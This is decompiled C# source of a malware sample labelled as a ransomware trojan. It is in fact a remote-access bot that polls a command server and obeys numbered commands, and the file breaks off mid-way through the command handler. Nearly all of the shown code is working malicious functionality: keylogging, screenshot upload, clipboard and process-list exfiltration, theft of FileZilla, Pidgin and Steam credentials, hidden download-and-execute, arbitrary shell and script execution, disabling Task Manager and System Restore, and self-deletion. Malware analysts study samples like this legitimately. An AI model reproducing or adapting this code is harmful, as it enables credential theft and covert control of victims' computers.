// Decompiled with JetBrains decompiler
// Type: Gold.Gold
// Assembly: Gold, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D2BFDAD7-F31D-41DD-A5F6-9A55CAB98563
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00041-msil\HEUR-Trojan-Ransom.Win32.Generic-19e75294fe15037f13824e64b67c6892f31ed2f657dc56849d3ad30eef7b4bef.exe

using Gold.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace Gold
{
  [StandardModule]
  internal sealed class Gold
  {
    private static string wicked = (string) null;
    private static string[] slickkidd = (string[]) null;
    private const uint LOCALE_SYSTEM_DEFAULT = 1024;
    private const uint LOCALE_SENGCOUNTRY = 4098;
    private static string ID = "W1ck3D";
    private static string country = Gold.Gold.GetCountry();
    private static string os = MyProject.Computer.Info.OSFullName.Replace("Microsoft ", "") + Gold.Gold.DetectOSBits();
    private static string os2 = MyProject.Computer.Info.OSFullName.Replace("Microsoft ", "");
    private static string UserPC = Environment.UserName.ToString() + "@" + Environment.MachineName.ToString();
    private static string Password;
    private static string Weburl;
    private static string UniqueID;
    private static string Mutex;
    private static string Filename;
    private static string StartupName;
    private static string ConnectionInt = Conversions.ToString(8000);
    private static string Location = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Temp\\";
    private static string cpuInfo = string.Empty;
    private static ManagementClass mc = new ManagementClass("win32_processor");
    private static ManagementObjectCollection moc = Gold.Gold.mc.GetInstances();
    private const int SWP_HIDEWINDOW = 128;
    private const int SWP_SHOWWINDOW = 64;
    private static int taskBar;
    private static string Keylogs = (string) null;
    private const string Chars = "abcdefghijklmnopqrstuvwxyz1234567890";
    public static string cPass;
    [AccessedThroughProperty("KH")]
    private static Gold.Gold.KeyboardHook _KH;
    private static string strin;

    static Gold() => Gold.Gold.KH = new Gold.Gold.KeyboardHook();

    [DllImport("Kernel32.dll")]
    private static extern int GetLocaleInfo(
      uint Locale,
      uint LCType,
      [Out] StringBuilder lpLCData,
      int cchData);

    private static string GetInfo(uint lInfo)
    {
      StringBuilder lpLCData = new StringBuilder(256);
      int localeInfo = Gold.Gold.GetLocaleInfo(1024U, lInfo, lpLCData, lpLCData.Capacity);
      return localeInfo > 0 ? lpLCData.ToString().Substring(0, checked (localeInfo - 1)) : string.Empty;
    }

    public static string GetCountry() => Gold.Gold.GetInfo(4098U);

    [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long mciSendString(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpCommandString,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpReturnString,
      long uReturnLength,
      long hwndCallback);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long SwapMouseButton(long bSwap);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern void SendMessage(int hWnd, uint msg, uint wParam, int lparam);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SetWindowPos(
      int hwnd,
      int hWndInsertAfter,
      int x,
      int y,
      int cx,
      int cy,
      int wFlags);

    [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

    [DllImport("user32", EntryPoint = "FindWindowExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FindWindowEx(
      int hWnd1,
      int hWnd2,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz1,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz2);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int ShowWindow(int hWnd, int nCmdShow);

    [DllImport("user32", EntryPoint = "BlockInput", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int apiBlockInput(int fBlock);

    [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetModuleFileName(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ExitProcess(uint uExitCode);

    [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int MoveFile(
      [MarshalAs(UnmanagedType.LPTStr), In] string lpExistingFileName,
      [MarshalAs(UnmanagedType.LPTStr), In] string lpNewFileName,
      long dwFlags);

    public static void MeltFile()
    {
      string executablePath1 = Application.ExecutablePath;
      string executablePath2 = Application.ExecutablePath;
      int moduleFileName = Gold.Gold.GetModuleFileName(0, ref executablePath2, 256);
      Gold.Gold.MoveFile(Strings.Left(executablePath1, moduleFileName), Path.GetTempPath() + "\\tmpG" + DateTime.Now.Millisecond.ToString() + ".tmp", 8L);
      Gold.Gold.ExitProcess(0U);
    }

    public static string DetectOSBits()
    {
      string str = (string) null;
      switch (IntPtr.Size)
      {
        case 4:
          str = "(x32)";
          break;
        case 8:
          str = "(x64)";
          break;
      }
      return str;
    }

    public static string DetectOSBits2()
    {
      string str = (string) null;
      switch (IntPtr.Size)
      {
        case 4:
          str = "32 Bit";
          break;
        case 8:
          str = "64 Bit";
          break;
      }
      return str;
    }

    public static string HWID()
    {
      try
      {
        foreach (ManagementObject managementObject in Gold.Gold.moc)
        {
          if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Gold.Gold.cpuInfo, "", false) == 0)
          {
            Gold.Gold.cpuInfo = managementObject.Properties["processorID"].Value.ToString();
            break;
          }
        }
      }
      finally
      {
        ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
        objectEnumerator?.Dispose();
      }
      return Gold.Gold.MD5(Gold.Gold.MD5(Gold.Gold.cpuInfo + Environment.UserName.ToString()) + Environment.MachineName.ToString());
    }

    [STAThread]
    public static void Main()
    {
      try
      {
        Thread.Sleep(3000);
        Gold.Gold.wicked = new ASCIIEncoding().GetString(Convert.FromBase64String("VDBSQ0t6QWtTYXplMGtSdHJCbWhrNW5vOVFQSUdicDFDYXdXSk83UUtGSEVYY2hHT1JSYkJMR3pjZFFCWjIweHc4ZE93Y2h5V1QxbHowMU9abDM0dlZiOUR2RmRmc043UkdrSXlUZk9qVTE1Nng0d1JHT1FCelhKeXVna052azBIdzRjck1QQWNDWVVOSkVrOGJxTFNHM1lwT21aNmR4MnE2Y3RjQ096bVBySU8weTVMVlkzNTZheUJpUmlmRENBWFFLZVFSaGFDN1FEb1VRN1Q4MEMwUW5RdEJ2dXQ0dk9rV2ZiUXFnU2xkN09JRFdOT3dnanIzSWQ3R05ZbU5hOUpQY0NEOGNPbUlLc2xTYXhnQzd4ejBsZkNBMDRMUkxyWVNvRW5zMXQ4aHVuUTNlR2N5RmU2QjMyQUczUUhwZEF1YzdpNjhSRm5rRHZIZmJ3ekIzaDJ2N2hES0szYVBWV0NKTm5IcGxFbjl2YWdmMmxBcGdtZWFwelljVUdsYUtpS2tnY1Z2allyUGlSanFMZThJOGtQWWZQVjBLcWtvQXpZS1c4QTgzSDZjdE5WOHBERjROOE45SG9iNFJLVDhlMzZXQXVMSU5uSzZNb2VPWWtVekFrSkFndlI3dlhzU0NlY2pOcTdSYzVLY1FnQUI1WnlzWUVkaXFqMUIyb0NNU0lheHVKWm5oS3Q2TE1VWWtVTDcwaDFqeW5NdTNmdDFET3dZYThidUtpamg1YzJsM0szMW5uWllaUGFJTmxTNEV4S1B5QVZHcE82aXZ4NGpzU3BRQ2NxRnJuUmdMMlZjbGoyamhwY09VUnVLd0Q3NlVIZ2pXSzhWdEhOUFRoVnBXUEo2VlJzOVVuRVVON3ZDNllGT2d6amR2TG5OSzNiM1VvRG9GRE9mVE9DMkJHVURucFFWWkJBZjZqQ210ckRqWWtZY0lzZURuME1kdldlOVhQNnMwaUdVckc0YndLMTFNR0hWY0Fkd2JmUExuUGwzZ1B3VjQ0VUNaemFkaUNGbEJlOHJkWGNFSUdEcVpwSVptYlJ2bmFTQU4zcW9iVkl0ODg4NDk3NTE5NDg5NDcxNTkwODQ5KjQ4NDA4NDc4OTc4NyoqKjU0MCotOCo4MCo0MCotNDUqNCotOCotMDU5NTQwMTUxNDgtNTE4OTQ4NDg0ODkxODk0LTE1NDE5NDQ4OCoxNTQqLSo0MTg1NDcqLTQ4OTQqLTQ4NDg5MDg0MDg0MS0xMDEwODQwKi8qKioqLTA0NC8vKi8tKi8tKjQwNSotODEw"));
        Gold.Gold.slickkidd = Strings.Split(new ASCIIEncoding().GetString(Convert.FromBase64String(Encoding.Default.GetString(Gold.Gold.ReadResource(Application.ExecutablePath)))), Gold.Gold.wicked);
        Gold.Gold.Weburl = Strings.StrReverse(Gold.Gold.slickkidd[0]);
        Gold.Gold.StartupName = Strings.StrReverse(Gold.Gold.slickkidd[1]);
        Gold.Gold.Password = Strings.StrReverse(Gold.Gold.slickkidd[2]);
        Gold.Gold.Mutex = Strings.StrReverse(Gold.Gold.slickkidd[3]);
        Gold.Gold.ID = Strings.StrReverse(Gold.Gold.slickkidd[4]);
        Gold.Gold.Filename = Strings.StrReverse(Gold.Gold.slickkidd[5]);
        Gold.Gold.ConnectionInt = Strings.StrReverse(Gold.Gold.slickkidd[6]);
        if (!new System.Threading.Mutex(false, Gold.Gold.Mutex).WaitOne(0, false))
          Gold.Gold.MeltFile();
        Gold.Gold.UniqueID = Gold.Gold.HWID();
        Gold.Gold.Installme();
        Gold.Gold.RegisterMe();
        Thread thread = new Thread(new ThreadStart(Gold.Gold.Commands));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        Application.Run();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Me_Timer_Passed()
    {
      Thread.Sleep(30000);
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Gold.Gold.Keylogs, (string) null, false) == 0)
        return;
      Gold.Gold.SinCommand("logger=" + Gold.Gold.Keylogs + "#&aka=" + Gold.Gold.UniqueID, "_bots/_logs/create.php");
      Gold.Gold.Keylogs = (string) null;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Commands()
    {
      Thread.Sleep(Conversions.ToInteger(Gold.Gold.ConnectionInt));
      while (true)
      {
        try
        {
          string[] strArray1 = Strings.Split(Gold.Gold.ReadMain(), "#");
          string Left = strArray1[0];
          if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(1), false) == 0)
          {
            string str1 = strArray1[1].Substring(checked (strArray1[1].LastIndexOf("/") + 1)).ToString();
            string str2 = Path.GetTempPath() + str1.Replace("?-*", (string) null);
            if (System.IO.File.Exists(str2))
              FileSystem.Kill(str2);
            if (str1.Contains("?-*"))
            {
              str1.Replace("?-*", (string) null);
              MyProject.Computer.Network.DownloadFile(strArray1[1].Replace("?-*", (string) null), str2);
              new Process()
              {
                StartInfo = {
                  FileName = str2,
                  CreateNoWindow = true,
                  WindowStyle = ProcessWindowStyle.Hidden
                }
              }.Start();
            }
            else
            {
              MyProject.Computer.Network.DownloadFile(strArray1[1], str2);
              Process.Start(str2);
            }
            Gold.Gold.UpdateStatus("Downloaded & Executed");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(2), false) == 0)
          {
            Application.Restart();
            Gold.Gold.UpdateStatus("Restarted Bot");
            ProjectData.EndApp();
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(3), false) == 0)
          {
            Gold.Gold.UpdateStatus("Exited Bot");
            ProjectData.EndApp();
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(4), false) == 0)
          {
            Process.Start(strArray1[1]);
            Gold.Gold.UpdateStatus("Visited Website");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(5), false) == 0)
          {
            Gold.Gold.UpdateStatus("Logged off");
            object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("Winmgmts:{impersonationLevel=impersonate,(Debug,Shutdown)}"));
            try
            {
              foreach (object obj in (System.Collections.IEnumerable) NewLateBinding.LateGet(objectValue, (System.Type) null, "InstancesOf", new object[1]
              {
                (object) "Win32_OperatingSystem"
              }, (string[]) null, (System.Type[]) null, (bool[]) null))
                Conversions.ToSingle(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj), (System.Type) null, "Win32Shutdown", new object[2]
                {
                  (object) 0,
                  (object) 0
                }, (string[]) null, (System.Type[]) null, (bool[]) null));
            }
            finally
            {
              System.Collections.IEnumerator enumerator;
              if (enumerator is IDisposable)
                (enumerator as IDisposable).Dispose();
            }
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(6), false) == 0)
          {
            Gold.Gold.UpdateStatus("Shuteddown PC");
            object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("Winmgmts:{impersonationLevel=impersonate,(Debug,Shutdown)}"));
            try
            {
              foreach (object obj in (System.Collections.IEnumerable) NewLateBinding.LateGet(objectValue, (System.Type) null, "InstancesOf", new object[1]
              {
                (object) "Win32_OperatingSystem"
              }, (string[]) null, (System.Type[]) null, (bool[]) null))
                Conversions.ToSingle(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj), (System.Type) null, "Win32Shutdown", new object[2]
                {
                  (object) 12,
                  (object) 0
                }, (string[]) null, (System.Type[]) null, (bool[]) null));
            }
            finally
            {
              System.Collections.IEnumerator enumerator;
              if (enumerator is IDisposable)
                (enumerator as IDisposable).Dispose();
            }
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(7), false) == 0)
          {
            Gold.Gold.UpdateStatus("Restarted PC");
            object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("Winmgmts:{impersonationLevel=impersonate,(Debug,Shutdown)}"));
            try
            {
              foreach (object obj in (System.Collections.IEnumerable) NewLateBinding.LateGet(objectValue, (System.Type) null, "InstancesOf", new object[1]
              {
                (object) "Win32_OperatingSystem"
              }, (string[]) null, (System.Type[]) null, (bool[]) null))
                Conversions.ToSingle(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj), (System.Type) null, "Win32Shutdown", new object[2]
                {
                  (object) 6,
                  (object) 0
                }, (string[]) null, (System.Type[]) null, (bool[]) null));
            }
            finally
            {
              System.Collections.IEnumerator enumerator;
              if (enumerator is IDisposable)
                (enumerator as IDisposable).Dispose();
            }
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(8), false) == 0)
          {
            Gold.Gold.UpdateStatus("PC Hibernated");
            Application.SetSuspendState(PowerState.Hibernate, true, true);
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(9), false) == 0)
          {
            string str3 = "set CDAudio door open";
            ref string local1 = ref str3;
            string str4 = "";
            ref string local2 = ref str4;
            Gold.Gold.mciSendString(ref local1, ref local2, 0L, 0L);
            Gold.Gold.UpdateStatus("Opened CD Drive");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(10), false) == 0)
          {
            string str5 = "set CDAudio door closed";
            ref string local3 = ref str5;
            string str6 = "";
            ref string local4 = ref str6;
            Gold.Gold.mciSendString(ref local3, ref local4, 0L, 0L);
            Gold.Gold.UpdateStatus("Closed CD Drive");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(11), false) == 0)
          {
            object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice"));
            object[] objArray1 = new object[1];
            object[] objArray2 = objArray1;
            string[] strArray2 = strArray1;
            string[] strArray3 = strArray2;
            int index1 = 1;
            int index2 = index1;
            string str = strArray3[index2];
            objArray2[0] = (object) str;
            object[] objArray3 = objArray1;
            object[] Arguments = objArray3;
            bool[] flagArray = new bool[1]{ true };
            bool[] CopyBack = flagArray;
            NewLateBinding.LateCall(objectValue, (System.Type) null, "speak", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
            if (flagArray[0])
              strArray2[index1] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof (string));
            Gold.Gold.UpdateStatus("PC has spoken");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(12), false) == 0)
          {
            Gold.Gold.SwapMouseButton(256L);
            Gold.Gold.UpdateStatus("Swapped Mouse");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(13), false) == 0)
          {
            Gold.Gold.SwapMouseButton(0L);
            Gold.Gold.UpdateStatus("Fixed Mouse");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(14), false) == 0)
          {
            Gold.Gold.SendMessage(-1, 274U, 61808U, 2);
            Gold.Gold.UpdateStatus("Monitor Off");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(15), false) == 0)
          {
            Gold.Gold.SendMessage(-1, 274U, 61808U, -1);
            Gold.Gold.UpdateStatus("Monitor On");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(16), false) == 0)
          {
            string str7 = "Progman";
            ref string local5 = ref str7;
            string str8 = (string) null;
            ref string local6 = ref str8;
            Gold.Gold.ShowWindow(Gold.Gold.FindWindowEx(0, 0, ref local5, ref local6), 0);
            Gold.Gold.UpdateStatus("DesktopIcons Hidden");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(17), false) == 0)
          {
            string str9 = "Progman";
            ref string local7 = ref str9;
            string str10 = (string) null;
            ref string local8 = ref str10;
            Gold.Gold.ShowWindow(Gold.Gold.FindWindowEx(0, 0, ref local7, ref local8), 5);
            Gold.Gold.UpdateStatus("DesktopIcons Visible");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(18), false) == 0)
          {
            Gold.Gold.apiBlockInput(1);
            Gold.Gold.UpdateStatus("Blocked Input");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(19), false) == 0)
          {
            Gold.Gold.apiBlockInput(0);
            Gold.Gold.UpdateStatus("Unblocked Input");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(20), false) == 0)
          {
            string str11 = "Shell_traywnd";
            ref string local9 = ref str11;
            string str12 = "";
            ref string local10 = ref str12;
            Gold.Gold.taskBar = Gold.Gold.FindWindow(ref local9, ref local10);
            Gold.Gold.UpdateStatus("Taskbar Hidden");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(21), false) == 0)
          {
            string str13 = "Shell_traywnd";
            ref string local11 = ref str13;
            string str14 = "";
            ref string local12 = ref str14;
            Gold.Gold.taskBar = Gold.Gold.FindWindow(ref local11, ref local12);
            Gold.Gold.UpdateStatus("Taskbar Visable");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(22), false) == 0)
          {
            Gold.Gold.Winserial();
            Gold.Gold.UpdateStatus("Sent Serialkey");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(23), false) == 0)
          {
            string str15 = (string) null;
            string str16 = Gold.Gold.Random1();
            strArray1[1] = new ASCIIEncoding().GetString(Convert.FromBase64String(strArray1[1]));
            System.IO.File.WriteAllText(Path.GetTempPath() + str16 + ".html", strArray1[1].Replace("<NEWLINE>", "\r\n"));
            Process.Start(Path.GetTempPath() + str16 + ".html", Conversions.ToString(1));
            str15 = (string) null;
            Gold.Gold.UpdateStatus("Html Scripted");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(24), false) == 0)
          {
            string str17 = (string) null;
            string str18 = Gold.Gold.Random1();
            strArray1[1] = new ASCIIEncoding().GetString(Convert.FromBase64String(strArray1[1]));
            System.IO.File.WriteAllText(Path.GetTempPath() + str18 + ".bat", strArray1[1].Replace("<NEWLINE>", "\r\n"));
            Process.Start(Path.GetTempPath() + str18 + ".bat", Conversions.ToString(1));
            str17 = (string) null;
            Gold.Gold.UpdateStatus("Batch Scripted");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(25), false) == 0)
          {
            string str19 = (string) null;
            string str20 = Gold.Gold.Random1();
            strArray1[1] = new ASCIIEncoding().GetString(Convert.FromBase64String(strArray1[1]));
            System.IO.File.WriteAllText(Path.GetTempPath() + str20 + ".vbs", strArray1[1].Replace("<NEWLINE>", "\r\n"));
            Process.Start(Path.GetTempPath() + str20 + ".vbs", Conversions.ToString(1));
            str19 = (string) null;
            Gold.Gold.UpdateStatus("VisualBasics Scripted");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(26), false) == 0)
          {
            MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object) "1", RegistryValueKind.DWord);
            Gold.Gold.UpdateStatus("Disabled Registry");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(27), false) == 0)
          {
            MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object) "0", RegistryValueKind.DWord);
            Gold.Gold.UpdateStatus("Enabled Registry");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(28), false) == 0)
          {
            MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object) "1", RegistryValueKind.DWord);
            Gold.Gold.UpdateStatus("Disabled Taskmanager");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(29), false) == 0)
          {
            MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object) "0", RegistryValueKind.DWord);
            Gold.Gold.UpdateStatus("Enabled Taskmanager");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(30), false) == 0)
          {
            MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object) "1", RegistryValueKind.DWord);
            Gold.Gold.UpdateStatus("Disabled Systemrestore");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(31), false) == 0)
          {
            MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object) "0", RegistryValueKind.DWord);
            Gold.Gold.UpdateStatus("Enabled Systemrestore");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(32), false) == 0)
          {
            MessageBoxButtons buttons = Gold.Gold.msgbuttons(strArray1[4]);
            MessageBoxIcon icon = Gold.Gold.msgicons(strArray1[3]);
            string update = (string) null;
            switch (MessageBox.Show(strArray1[2].Replace("<NEWLINE>", "\r\n"), strArray1[1].Replace("<NEWLINE>", "\r\n"), buttons, icon))
            {
              case DialogResult.OK:
                update = "Answer : Ok";
                break;
              case DialogResult.Cancel:
                update = "Answer : Cancel";
                break;
              case DialogResult.Abort:
                update = "Answer : Abort";
                break;
              case DialogResult.Retry:
                update = "Answer : Retry";
                break;
              case DialogResult.Ignore:
                update = "Answer : Ignore";
                break;
              case DialogResult.Yes:
                update = "Answer : Yes";
                break;
              case DialogResult.No:
                update = "Answer : No";
                break;
            }
            Gold.Gold.UpdateStatus(update);
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(33), false) == 0)
          {
            Point pt = new Point(0, 0);
            int width = Screen.GetBounds(pt).Width;
            pt = new Point(0, 0);
            int height = Screen.GetBounds(pt).Height;
            Bitmap bitmap = new Bitmap(width, height);
            Graphics.FromImage((Image) bitmap).CopyFromScreen(0, 0, 0, 0, new Size(width, height));
            bitmap.Save(Path.GetTempPath() + Gold.Gold.UniqueID + ".jpg", ImageFormat.Jpeg);
            ServicePointManager.Expect100Continue = false;
            new WebClient().UploadFile(Gold.Gold.Weburl + "_bots/_imgs/create.php?fine=" + Gold.Gold.UniqueID, "POST", Path.GetTempPath() + Gold.Gold.UniqueID + ".jpg");
            System.IO.File.Delete(Path.GetTempPath() + Gold.Gold.UniqueID + ".jpg");
            Gold.Gold.UpdateStatus("Image Uploaded");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(34), false) == 0)
          {
            Gold.Gold.SinCommand("logger=" + Gold.Gold.Keylogs + "#&aka=" + Gold.Gold.UniqueID, "_bots/_logs/create.php");
            Gold.Gold.Keylogs = (string) null;
            Gold.Gold.UpdateStatus("Keylogs Sent");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(35), false) == 0)
          {
            Gold.Gold.SinCommand("uniqueid=" + Gold.Gold.UniqueID + "&password=" + Gold.Gold.Password, "system/_kill.php");
            Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(Gold.Gold.StartupName, false);
            Gold.Gold.UpdateStatus("Uninstalled");
            Gold.Gold.MeltFile();
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(36), false) == 0)
          {
            Process.Start(strArray1[1]);
            Gold.Gold.UpdateStatus("Website Visited");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(37), false) == 0)
          {
            Gold.Gold.SinCommand("proc=" + Gold.Gold.delegateproces() + "&unid=" + Gold.Gold.UniqueID, "system/_prcs.php");
            Gold.Gold.UpdateStatus("Processlist Received");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(38), false) == 0)
          {
            Gold.Gold.KickHisAss(strArray1[1]);
            Gold.Gold.UpdateStatus("ProcessKilled");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(39), false) == 0)
          {
            Gold.Gold.SinCommand("info=" + (Gold.Gold.AccountType() + "#" + Gold.Gold.DetectOSBits2() + "#" + Gold.Gold.ID + "#" + Gold.Gold.GetCountry() + "#" + Application.StartupPath + "#" + Environment.UserName + "#" + Gold.Gold.defaultbrowser() + "#" + Gold.Gold.os2 + "#" + Environment.MachineName + "#" + Path.GetPathRoot(Environment.SystemDirectory) + "#" + Strings.Mid(Conversions.ToString((double) Environment.TickCount / 3600000.0), 1, 5) + " Hours").Replace("\\", "^") + "&unid=" + Gold.Gold.UniqueID, "system/_pinfo.php");
            Gold.Gold.UpdateStatus("PC Specifications Received");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(40), false) == 0)
          {
            MyProject.Computer.Clipboard.Clear();
            Gold.Gold.UpdateStatus("Clip Cleared");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(41), false) == 0)
          {
            MyProject.Computer.Clipboard.SetText(strArray1[1]);
            Gold.Gold.UpdateStatus("Clip Changed");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(42), false) == 0)
          {
            Gold.Gold.SinCommand("clip=" + MyProject.Computer.Clipboard.GetText() + "&unid=" + Gold.Gold.UniqueID, "system/_clip.php");
            Gold.Gold.UpdateStatus("Clip Received");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(43), false) == 0)
          {
            Gold.Gold.FileZilla();
            Gold.Gold.Imvu();
            Gold.Gold.WindowsLiveMessenger();
            Gold.Gold.DynDns();
            Gold.Gold.Pidgin();
            Gold.Gold.GetSteamUsername();
            Gold.Gold.UpdateStatus("Sent P. Passwords");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(44), false) == 0)
          {
            string str = strArray1[1].Substring(checked (strArray1[1].LastIndexOf("/") + 1)).ToString();
            MyProject.Computer.Network.DownloadFile(strArray1[1], Path.GetTempPath() + str);
            string lpvParam = Path.GetTempPath() + str;
            Gold.Gold.SystemParametersInfo(20, 0, ref lpvParam, 1);
            Gold.Gold.UpdateStatus("Changed Background");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(45), false) == 0)
          {
            Interaction.Shell(strArray1[1], AppWinStyle.Hide);
            Gold.Gold.UpdateStatus("Command Executed");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(46), false) == 0)
          {
